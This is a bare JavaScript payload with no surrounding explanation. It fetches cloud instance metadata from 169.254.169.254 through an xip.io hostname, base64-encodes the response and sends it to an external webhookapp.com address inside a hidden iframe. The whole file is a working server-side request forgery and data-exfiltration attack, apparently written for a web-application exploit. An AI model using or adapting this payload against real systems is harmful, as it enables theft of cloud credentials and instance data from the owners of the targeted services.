function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "http://05747023.proxy.webhookapp.com//?aa="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/profile"); 
oReq.send();
